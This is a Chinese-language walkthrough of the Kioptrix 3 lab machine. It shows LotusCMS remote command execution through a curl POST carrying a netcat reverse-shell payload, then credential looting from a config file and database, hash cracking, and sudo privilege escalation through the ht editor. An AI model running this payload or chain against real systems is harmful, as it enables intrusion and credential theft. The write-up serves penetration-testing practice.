### 信息收集
nmap 扫描目标开放22和80端口
### web渗透
主页显示信息是关于一个画廊cms，跳转至登录页面，信息显示是lotusCMS
#### 公开漏洞利用
google 搜索lotusCMS 发现3.0存在远程命令执行漏洞
```
');#{stub}#
在/index?page=index url下可以执行命令
报告提示将参数post提交，我们将命令写入文件，curl看看能不能执行

curl http://192.168.1.17/index.php -d @a.txt

a.txt:
page=index');${system("nc -e /bin/bash 192.168.1.3 4444")};#

本地开启监听，获得shell
```
### 提权
```
find 可执行文件和s位文件均无发现
也没有定时任务
最后查看敏感文件，在/home/www/kioptrix3.com/gallery下发现gconfig.php
文件暴露mysql root密码：fuckeyou
```
#### 数据库查询user，passwd
```
查看gallery 数据库
select * from dev_accounts;
+----+------------+----------------------------------+
| id | username   | password                         |
+----+------------+----------------------------------+
|  1 | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 | 
|  2 | loneferret | 5badcaf789d3d1d09794d8f021f40f0e | 
+----+------------+----------------------------------+

john破解loneferret:starwars为可登录用户

ssh loneferret@192.168.1.17 -o HostKeyAlgorithms=+ssh-rsa -o HostKeyAlgorithms=+ssh-dss
连接成功
```
#### ht提权
```
sudo -l 
    (root) NOPASSWD: !/usr/bin/su
    (root) NOPASSWD: /usr/local/bin/ht
发现ht有root权限
ht是一个编辑器
我们利用ht在sudoers写入/bin/bash
sudo /bin/bash 提权成功

```